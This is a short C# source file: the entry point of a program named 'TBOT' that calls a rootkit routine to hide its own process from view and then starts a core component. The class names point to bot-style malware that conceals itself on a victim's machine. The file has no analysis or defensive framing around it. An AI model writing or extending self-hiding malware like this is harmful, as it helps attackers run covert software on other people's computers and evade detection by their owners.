using System.Diagnostics;

namespace TBOT;

internal class Program
{
	public static void Main(string[] args)
	{
		rootkit.HideProcess(Process.GetCurrentProcess());
		new Core();
	}
}
